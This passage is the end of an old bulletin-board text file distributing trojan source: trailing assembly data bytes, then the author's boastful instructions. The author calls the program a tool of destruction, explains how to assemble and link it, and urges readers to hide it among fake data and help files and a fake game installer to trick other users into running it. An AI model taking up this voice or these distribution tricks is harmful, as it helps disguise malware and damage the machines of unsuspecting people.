		db       90h, 3Fh,0EDh, 79h,0EAh,0B9h
		db       74h, 5Bh, 90h, 11h, 62h, 20h
		db      0E3h, 91h,0E5h, 5Dh, 5Eh, 11h
		db       67h, 71h, 8Bh, 91h, 89h,0B1h
		db       7Fh, 15h, 92h,0B1h, 13h
		db      26h
		db      1024 dup (0)

stack_seg_b     ends



		end     
-=[------------------------------------------------------------------------[=-

   Once again, this is a tool of destuction, and I suggest you use it wisely.
NOT! Go and Phuck SomeOne Royaly.  All you need to do is to cut at the dotted
linez and paste it to a phile called INDY6.ASM, and then type:
	      
			  TASM INDY6.ASM

	     Then After You've Accomplished This, then type:

			  LINK INDY6.OBJ

     O.K, so now you have a kewl Trojan, now go and INSTIGATE some TURMOIL!
And remember, only fools run programs called INDY6.EXE, so if you really 
want to PHUCK someone up, include it with a bunch of texts and Fake Data 
philez, and some Help filez too! Archive Em' then upload it to your favorite
Lamer Haven bbs.  Or, if you know some basic, use Q-basic and make an 
installer, then tell them to type something like INDIANA to play the game,
Yes, also say it requires VGA, so it sounds Kick Ass.  

		   Yet Another Phile Brought To You By:
				 
				 
				  ZaP    
			      </>PHAiT<\>


			      -=[Greetz]=-

				 BiSHoP
			      .\/\eAtHeA|>

I'm Out!

The Great ZapPa Has SpokEn! 

